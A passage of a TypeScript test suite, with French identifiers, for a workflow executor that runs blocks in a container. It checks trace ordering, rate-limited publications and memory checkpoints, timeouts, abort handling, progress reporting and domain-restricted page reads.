      { bloc: "liste", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "fiche", etape: "debut" },
      { bloc: "avis", etape: "debut" },
      { bloc: "fiche", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "avis", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 1 },
    ]);

    // End of avis before that of fiche: rejected; avis started without an end, the output (arriving too early) rejected.
    const unordered = await banc(watch({ auFilDeLEau: true }), {}, {
      lancer: launcherSteps([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("avis"), finBloc("fiche"),
        debutBloc("sortie"),
        { t: "fin", donnees: [] },
      ]),
    });
    const relayees2: unknown[] = [];
    unordered.infra.surTrace = (t) => relayees2.push(t);
    const r2 = await executerWorkflow(unordered.ctx, unordered.infra);
    expect(r2.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "echoue", "pas-lance"]);
    expect(relayees2).not.toContainEqual(expect.objectContaining({ bloc: "avis", etape: "fin" }));

    // Without auFilDeLEau: two debut in a row, the second is rejected as today.
    const sans = await banc(watch(), {}, {
      lancer: launcherSteps([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
        { t: "fin", donnees: [] },
      ]),
    });
    const r3 = await executerWorkflow(sans.ctx, sans.infra);
    expect(r3.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);

    // A trial has no chain: same rejection.
    const e = await banc(watch({ auFilDeLEau: true }), {}, {
      lancer: launcherSteps([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
        { t: "fin", donnees: [] },
      ]),
    });
    attempt(e);
    const r4 = await executerWorkflow(e.ctx, e.infra);
    expect(r4.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);
  });

  it("publication relayed only during the chain and 5 s apart; ignored before the chain, for a trial, without auFilDeLEau, beyond 2 MB", async () => {
    const gros = "x".repeat(2 * 1024 * 1024);
    const pas = (advance: (ms: number) => () => void) => [
      debutBloc("liste"), finBloc("liste"),
      pub("avant la chaîne", 0, 3),
      debutBloc("fiche"),
      pub("entre deux debut", 0, 3),
      debutBloc("avis"),
      pub("A", 1, 3),
      advance(3000), pub("trop tôt", 2, 3),
      advance(1500), pub("C", 2, 3),
      advance(5000), pub("faits > total", 4, 3),
      advance(5000), pub(gros, 3, 3),
      advance(5000), pub("D", 3, 3),
      finBloc("fiche"),
      advance(5000), pub("après une fin", 3, 3),
      finBloc("avis"),
      advance(5000), pub("après la chaîne", 3, 3),
      debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ];
    const launchWith = async (workflow: unknown, set: (b: Banc) => void = () => {}) => {
      const b = await banc(workflow);
      const advance = fakeClock(b);
      b.infra.lancer = launcherSteps(pas(advance));
      set(b);
      const relayed: unknown[] = [];
      b.infra.surPublication = async (p) => {
        relayed.push(p);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
      return relayed;
    };

    expect(await launchWith(watch({ auFilDeLEau: true }))).toEqual([
      { donnees: "A", faits: 1, total: 3 },
      { donnees: "C", faits: 2, total: 3 },
      { donnees: "D", faits: 3, total: 3 },
    ]);
    expect(await launchWith(watch({ auFilDeLEau: true }), attempt)).toEqual([]);
    expect(await launchWith(watch(), (b) => void (b.ctx.dureeMaxMinutes = 30))).toEqual([]);
  });

  it("a slow surPublication is finished before executerWorkflow returns", async () => {
    const b = await banc(watch({ auFilDeLEau: true }));
    const advance = fakeClock(b);
    b.infra.lancer = launcherSteps([
      debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis"),
      pub("A", 1, 2), advance(5000), pub("B", 2, 2),
      finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
      { t: "fin", donnees: "finale" },
    ]);
    const finished: unknown[] = [];
    let enCours = 0;
    let auPlus = 0;
    b.infra.surPublication = async (p) => {
      enCours++;
      auPlus = Math.max(auPlus, enCours);
      await new Promise((ok) => setTimeout(ok, 80));
      finished.push(p.donnees);
      enCours--;
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(finished).toEqual(["A", "B"]);
    expect(auPlus).toBe(1);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "finale" } });
  });

  it("progressive: surMemoire at most every 30 s; an echec carries the last memory received; non-progressive: neither surMemoire nor memoire in the outcome", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const hash = paramsHash(valid(watch()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const m = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n }, inconnu: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte: hash } });
    const launchWith = async (d: number | undefined, fin: unknown = { t: "echec", erreur: "cassé" }) => {
      const b = await banc(watch());
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      const advance = fakeClock(b);
      b.infra.lancer = launcherSteps([m(1), advance(10_000), m(2), advance(25_000), m(3), m(4), fin]);
      const relayed: unknown[] = [];
      b.infra.surMemoire = async (x) => {
        relayed.push(x);
      };
      const r = await executerWorkflow(b.ctx, b.infra);
      return { r, relayees: relayed };
    };

    const prog = await launchWith(30);
    expect(prog.relayees).toEqual([marquee(1), marquee(3)]);
    expect(prog.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });

    const sans = await launchWith(undefined);
    expect(sans.relayees).toEqual([]);
    expect(sans.r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });

    // A fin keeps the memory as today.
    const fin = await launchWith(30, { t: "fin", donnees: null });
    expect(fin.r.issue).toMatchObject({ t: "fin", memoire: marquee(4) });
  });

  it("progressive: a stop (timeout) carries the last memory received; a memory still held (nothing received after) does not count; non-progressive: none", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const hash = paramsHash(valid(watch()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const launchWith = async (d: number | undefined) => {
      const b = await banc(watch(), {}, { delaiMs: 300 });
      if (d !== undefined) b.ctx.dureeMaxMinutes = d;
      b.infra.lancer = launcherSteps(
        [
          { t: "memoire", memoire: { liste: { type: "code", valeur: 7 } } },
          { t: "journal", bloc: "liste", texte: "suite" },
          // Held until the next line, which never arrives: it could precede a publication never read.
          { t: "memoire", memoire: { liste: { type: "code", valeur: 8 } } },
        ],
        { bloque: true },
      );
      return (await executerWorkflow(b.ctx, b.infra)).issue;
    };
    expect(await launchWith(30)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé", memoire: { liste: { type: "code", valeur: 7, empreinte: hash } } });
    expect(await launchWith(undefined)).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
  });

  describe("the memory that precedes a publication follows its fate (R34)", () => {
    const hash = () => paramsHash(valid(watch()).workflow.blocs.find((x) => x.id === "liste")!.parametres);
    const mem = (n: number) => ({ t: "memoire", memoire: { liste: { type: "code", valeur: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", valeur: n, empreinte: hash() } });
    const openChain = [debutBloc("liste"), finBloc("liste"), debutBloc("fiche"), debutBloc("avis")];
    const launchWith = async (pas: (advance: (ms: number) => () => void) => unknown[]) => {
      const b = await banc(watch({ auFilDeLEau: true }));
      const advance = fakeClock(b);
      b.infra.lancer = launcherSteps(pas(advance));
      const published: unknown[] = [];
      const memories: unknown[] = [];
      b.infra.surPublication = async (p) => void published.push(p.donnees);
      b.infra.surMemoire = async (m) => void memories.push(m);
      const r = await executerWorkflow(b.ctx, b.infra);
      return { issue: r.issue, publiees: published, memoires: memories };
    };

    it("a publication over 2 MB followed by an echec: the outcome carries the earlier memory, even after other memories", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(5000), mem(2), pub("x".repeat(2 * 1024 * 1024 + 10), 2, 3),
        // Sent next by the container (verifierMemoire, before echec): it still retains the keys of the rejected publication.
        advance(40_000), mem(3),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("a publication accepted after a rejected one puts the memory back on track", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(5000), mem(2), pub("faits > total", 4, 3),
        advance(1000), mem(3), pub("B", 2, 3),
        mem(4),
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.publiees).toEqual(["A", "B"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(4) });
    });

    it("two publications in the same stdout chunk: the second is rejected and its memory dropped", async () => {
      const ligne = (x: unknown) => JSON.stringify(x) + "\n";
      const r = await launchWith(() => [
        ...openChain,
        ligne(mem(1)) + ligne(pub("A", 1, 3)) + ligne(mem(2)) + ligne(pub("B", 2, 3)) + ligne({ t: "echec", erreur: "cassé" }),
      ]);
      expect(r.publiees).toEqual(["A"]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });

    it("a fin keeps the last memory received, as before (the output shows everything)", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(1000), mem(2), pub("trop tôt", 2, 3),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(3),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(3) });
    });

    it("F1: a publication's data is written before the memory it makes safe", async () => {
      const b = await banc(watch({ auFilDeLEau: true }));
      b.infra.lancer = launcherSteps([...openChain, mem(1), pub("A", 1, 3), { t: "echec", erreur: "cassé" }]);
      const written: string[] = [];
      b.infra.surPublication = async (p) => {
        await new Promise((ok) => setTimeout(ok, 20));
        written.push(`donnees ${p.donnees}`);
      };
      b.infra.surMemoire = async (m) => void written.push(`memoire ${m.liste?.valeur}`);
      const r = await executerWorkflow(b.ctx, b.infra);
      expect(written).toEqual(["donnees A", "memoire 1"]);
      expect(r.issue).toMatchObject({ memoire: marquee(1) });
    });

    it("F1: a refused data write leaves the memory doubtful until the next written publication", async () => {
      const lancer = async (pas: unknown[]) => {
        const b = await banc(watch({ auFilDeLEau: true }));
        const advance = fakeClock(b);
        b.infra.lancer = launcherSteps(pas.map((p) => (p === "avancer" ? advance(5000) : p)));
        const memories: unknown[] = [];
        b.infra.surPublication = async (p) => {
          if (p.donnees === "refusee") throw new Error("disque plein");
        };
        b.infra.surMemoire = async (m) => void memories.push(m);
        const r = await executerWorkflow(b.ctx, b.infra);
        return { issue: r.issue, memoires: memories };
      };
      const denied = await lancer([...openChain, mem(1), pub("refusee", 1, 3), mem(2), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }]);
      expect(denied.memoires).toEqual([]);
      expect(denied.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: null });
      const reprise = await lancer([...openChain, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "echec", erreur: "cassé" }]);
      expect(reprise.memoires).toEqual([marquee(2)]);
      expect(reprise.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(3) });
    });

    it("a memory after the output block's end, then fin: neither relayed nor safe, it only serves the fin outcome", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("a memory followed by fin is not relayed, even without an output end trace", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000), mem(2),
        { t: "fin", donnees: "finale" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "fin", memoire: marquee(2) });
    });

    it("a memory after the output block's end, then echec: the outcome keeps the earlier safe memory", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000),
        finBloc("fiche"), finBloc("avis"), debutBloc("sortie"), finBloc("sortie"),
        mem(2), { t: "journal", bloc: "sortie", texte: "après" },
        { t: "echec", erreur: "cassé" },
      ]);
      expect(r.memoires).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true, memoire: marquee(1) });
    });
  });

  it("interpreteur.mjs's TAILLE_MAX_DONNEES equals the kernel's, re-exported by accueil", async () => {
    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreteur.mjs")).href);
    expect(interpreter.TAILLE_MAX_DONNEES).toBe(DATA_MAX_SIZE);
    expect(TAILLE_MAX_DONNEES_ACCUEIL).toBe(DATA_MAX_SIZE);
    expect(DATA_MAX_SIZE).toBe(2 * 1024 * 1024);
  });

  it("executer.ts's ECART_PUBLICATIONS_MS and ECART_MEMOIRE_MS equal those of interpreteur.mjs", async () => {
    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreteur.mjs")).href);
    expect(PUBLICATIONS_GAP_MS).toBe(5000);
    expect(MEMORY_GAP_MS).toBe(30_000);
    expect(interpreter.ECART_PUBLICATIONS_MS).toBe(PUBLICATIONS_GAP_MS);
    expect(interpreter.ECART_MEMOIRE_MS).toBe(MEMORY_GAP_MS);
  });
});

describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
  /** A fake container: writes its lines, then waits to be killed (`bloque`) or exits with 0. `recu`: what it receives. */
  const launcherLines = (lignes: unknown[], o: { recu?: string[]; bloque?: boolean; tue?: () => void } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let kill = () => {};
    const fin = new Promise<number | null>((ok) => {
      kill = () => {
        o.tue?.();
        stdout.end();
        stderr.end();
        ok(null);
      };
      setImmediate(() => {
        for (const l of lignes) stdout.write(JSON.stringify(l) + "\n");
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      });
    });
    return { stdin, stdout, stderr, tuer: () => kill(), fin };
  };

  it("a widget's debut line is identical to before (snapshot)", async () => {
    const received: string[] = [];
    const b = await banc(chain("a"), {}, { lancer: launcherLines([{ t: "fin", donnees: null }], { recu: received }) });
    await executerWorkflow(b.ctx, b.infra);
    const workflow = JSON.stringify({ blocs: b.ctx.valide.workflow.blocs, liens: b.ctx.valide.workflow.liens, ordre: ["a", "sortie"] });
    expect(received.join("").split("\n")[0]).toBe(
      `{"t":"debut","precedent":null,"maintenant":"2026-10-29T10:00:00.000Z","config":{"interets":"rust"},"workflow":${workflow}}`,
    );
  });

  it("an action sends saisie and avancement in debut", async () => {
    const received: string[] = [];
    const owners: unknown[] = [];
    const b = await banc(chain("a"), {}, { lancer: launcherLines([{ t: "fin", donnees: [] }], { recu: received }) });
    b.ctx.proprietaire = { type: "action", id: "leboncoin" };
    b.ctx.saisie = "clio lyon";
    b.ctx.avancement = true;
    b.infra.atelier.commandeRecolte = (p, d, m) => (owners.push(p), ["docker", "run", nameOf(p), d, m]);
    const r = await executerWorkflow(b.ctx, b.infra);
    const debut = JSON.parse(received.join("").split("\n")[0]!);
    expect(debut).toMatchObject({ t: "debut", saisie: "clio lyon", avancement: true });
    expect(r.execution).toMatchObject({ proprietaire: { type: "action", id: "leboncoin" }, saisie: "clio lyon" });
    // The workshop receives the whole owner: an action's container has its own name.
    expect(owners).toEqual([{ type: "action", id: "leboncoin" }]);
  });

  it("a lirePage of https://gitlab.com/x emits lecture « gitlab.com » on the current block", async () => {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [{ url: "https://gitlab.com/x", titre: "X", texte: "", liens: [] }] } });
    const b = await banc(
      chain("a", "b"),
      {
        "a.mjs": `export default async () => 1;`,
        "b.mjs": `export default async (e, w) => (await w.lirePage("https://gitlab.com/x")).titre;`,
      },
      { pont },
    );
    b.ctx.proprietaire = { type: "action", id: "gitlab" };
    const relayed: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayed.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "X" } });
    expect(relayed).toEqual([
      { bloc: "a", etape: "debut" },
      { bloc: "a", etape: "fin", statut: "reussi", elements: null },
      { bloc: "b", etape: "debut" },
      { bloc: "b", etape: "lecture", hote: "gitlab.com" },
      { bloc: "b", etape: "fin", statut: "reussi", elements: null },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: null },
    ]);
  });

  it("a refused read (undeclared domain) emits no lecture", async () => {
    const b = await banc(chain("a"), { "a.mjs": `export default async (e, w) => { try { await w.lirePage("https://tiers.example/"); } catch { return "refusée"; } };` }, { compte: ["gitlab.com"], publiques: [] });
    const relayed: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayed.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: "refusée" } });
    expect(relayed.some((t) => t.etape === "lecture")).toBe(false);
  });

  it("signal raised: container killed, status interrompue, error ACTION_ARRETEE, erreurNoyau", async () => {
    let tue = 0;
    const stop = new AbortController();
    const b = await banc(chain("a"), {}, { lancer: launcherLines([{ t: "bloc", id: "a", etape: "debut" }], { bloque: true, tue: () => tue++ }) });
    b.ctx.proprietaire = { type: "action", id: "gitlab" };
    b.ctx.signal = stop.signal;
    b.infra.surTrace = (t) => {
      if (t.etape === "debut") setImmediate(() => stop.abort());
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(tue).toBe(1);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: ACTION_STOPPED });
    expect(r.execution).toMatchObject({ statut: "interrompue", erreur: ACTION_STOPPED, erreurNoyau: true });
    expect(r.execution.blocs[0]!.statut).toBe("interrompu");
    expect(b.supprimes).toEqual(["action:gitlab", "action:gitlab"]);
  });

  it("an already-raised signal: nothing is launched, run interrupted", async () => {
    const stop = new AbortController();
    stop.abort();
    const b = await banc(chain("a"));
    b.ctx.signal = stop.signal;
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(b.commandes).toEqual([]);
    expect(r.execution).toMatchObject({ statut: "interrompue", erreur: ACTION_STOPPED, erreurNoyau: true });
  });

  it("an avancement line with faits > total is rejected", async () => {
    const b = await banc(chain("a"), {}, {
      lancer: launcherLines([
        { t: "bloc", id: "a", etape: "debut" },
        { t: "bloc", id: "a", etape: "avancement", faits: 3, total: 2 },
        { t: "bloc", id: "a", etape: "avancement", faits: -1, total: 2 },
        { t: "bloc", id: "sortie", etape: "avancement", faits: 1, total: 2 },
        { t: "bloc", id: "a", etape: "avancement", faits: 2, total: 2 },
        { t: "bloc", id: "a", etape: "fin", statut: "reussi", sortie: [1, 2] },
        { t: "bloc", id: "a", etape: "avancement", faits: 2, total: 2 },
        { t: "bloc", id: "sortie", etape: "debut" },
        { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [1, 2] },
        { t: "fin", donnees: [1, 2] },
      ]),
    });
    b.ctx.avancement = true;
    const relayed: DirectTrace[] = [];
    b.infra.surTrace = (t) => relayed.push(t);
    await executerWorkflow(b.ctx, b.infra);
    // Only that of the current block, with faits ≤ total, passes; an avancement outside its block is ignored.
    expect(relayed.filter((t) => t.etape === "avancement")).toEqual([{ bloc: "a", etape: "avancement", faits: 2, total: 2 }]);
  });

  it("avancement: at most one per ECART_AVANCEMENT_MS and per block, the last (faits = total) always; ignored without avancement", async () => {
    let t = 0;
    const lignes = [
      { t: "bloc", id: "a", etape: "debut" },
      ...[1, 2, 3, 4].map((done) => ({ t: "bloc", id: "a", etape: "avancement", faits: done, total: 4 })),
      { t: "bloc", id: "a", etape: "fin", statut: "reussi", sortie: [] },
      { t: "bloc", id: "sortie", etape: "debut" },
      { t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: [] },
      { t: "fin", donnees: [] },
    ];
    const updateEntry = await banc(chain("a"), {}, { lancer: launcherLines(lignes) });
    updateEntry.ctx.avancement = true;
    // 300 ms between two received lines.
    updateEntry.infra.horloge = () => new Date(NOW.getTime() + (t += 300));
    const relayed: DirectTrace[] = [];
    updateEntry.infra.surTrace = (x) => relayed.push(x);
    await executerWorkflow(updateEntry.ctx, updateEntry.infra);
    const done = relayed.flatMap((x) => (x.etape === "avancement" ? [x.faits] : []));
    expect(done[0]).toBe(1);
    expect(done.at(-1)).toBe(4);
    expect(done.length).toBeLessThan(4);

    const sans = await banc(chain("a"), {}, { lancer: launcherLines(lignes) });
    const relayees2: DirectTrace[] = [];
    sans.infra.surTrace = (x) => relayees2.push(x);
    await executerWorkflow(sans.ctx, sans.infra);
    expect(relayees2.some((x) => x.etape === "avancement")).toBe(false);
  });
});
